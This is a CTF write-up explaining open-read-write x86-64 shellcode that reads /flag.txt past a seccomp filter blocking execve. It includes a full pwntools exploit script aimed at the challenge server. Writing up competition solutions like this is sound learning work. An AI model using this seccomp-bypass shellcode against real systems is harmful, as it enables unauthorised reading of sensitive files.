---
title: "Shell Four ORW — Open-Read-Write Shellcode with Seccomp"
date: 2025-01-01
categories: ["CyberChallenge"]
series: ["CyberChallenge Italy"]
tags: ["pwn", "shellcode", "seccomp", "orw", "openat", "syscall", "x86-64"]
difficulty: "intermediate"
summary: "Write open-read-write shellcode to exfiltrate /flag.txt when execve is blocked by a seccomp filter."
---

## The Challenge

The binary accepts arbitrary shellcode and executes it, but a seccomp policy blocks `execve` (and likely `execveat`). You can't pop a shell. Instead you have to use only open/read/write syscalls to open `/flag.txt`, read its contents into a buffer, and write that buffer to stdout.

## Approach

When `execve` is blocked, the fallback is ORW shellcode: three syscalls in sequence.

1. **`openat`** — open a file by path. Syscall 257 on x86-64. Arguments: `rdi = AT_FDCWD (-100)`, `rsi = pointer to "/flag.txt"`, `rdx = O_RDONLY (0)`. Returns a file descriptor in `rax`.
2. **`read`** — read from that fd into a buffer. Syscall 0. Arguments: `rdi = fd`, `rsi = buffer address`, `rdx = count (e.g., 100)`. I use `rsp` as the buffer — the stack pointer is a reliable writable address.
3. **`write`** — write the buffer to stdout. Syscall 1. Arguments: `rdi = 1 (stdout)`, `rsi = buffer address` (same `rsp` as before), `rdx = count`.

The filename string `/flag.txt` needs to live somewhere in memory where `rsi` can point to it. I placed it as a label right after the instructions — a `.ascii "/flag.txt"` at the end of the shellcode blob. Then `lea rsi, [rip+filename]` computes its address at runtime relative to the instruction pointer. This is clean and position-independent.

## Solution

```python
from pwn import *

context.arch = 'amd64'

HOST = "shellfour.pwn.ccit25.chals.havce.it"
PORT = 1340

r = remote(HOST, PORT)

shellcode = asm('''
    /* openat(AT_FDCWD, "/flag.txt", O_RDONLY) */
    mov     rax, 257           /* syscall: openat */
    mov     rdi, -100          /* AT_FDCWD */
    lea     rsi, [rip+filename]/* pt a "flag.txt" */
    xor     rdx, rdx           /* == 0 --> RDONLY */
    syscall

    /* read(fd, rsp, 100) */
    mov     rdi, rax           /* file descriptor */
    mov     rsi, rsp           /* buffer: stack */
    mov     rdx, 100           /* max = 100 */
    xor     rax, rax           /* == 0 --> read */
    syscall

    /* write(1, rsp, 100) */
    mov     rdi, 1             /* stdout */
    mov     rax, 1             /* ==1 --> write */
    syscall

filename:
    .ascii "/flag.txt"
''')

print(f"{len(shellcode)}")
r.send(shellcode)
print(r.recvall().decode(errors= 'ignore'))
```

The filename string `/flag.txt` lives right after the shellcode instructions, placed as an `.ascii` label. The `lea rsi, [rip+filename]` instruction computes its address relative to the current instruction pointer — this is position-independent and works wherever the shellcode lands in memory.

Using `rsp` as the read/write buffer is a simple trick: the stack pointer always points to writable memory, so there is no need to set up a separate buffer.

## What I Learned

Seccomp-blocked `execve` is an extremely common CTF mitigation. ORW shellcode is the standard response: three syscalls, no shell, but you read the flag directly. The `rip`-relative addressing and `rsp`-as-buffer patterns are worth memorizing for competition use.
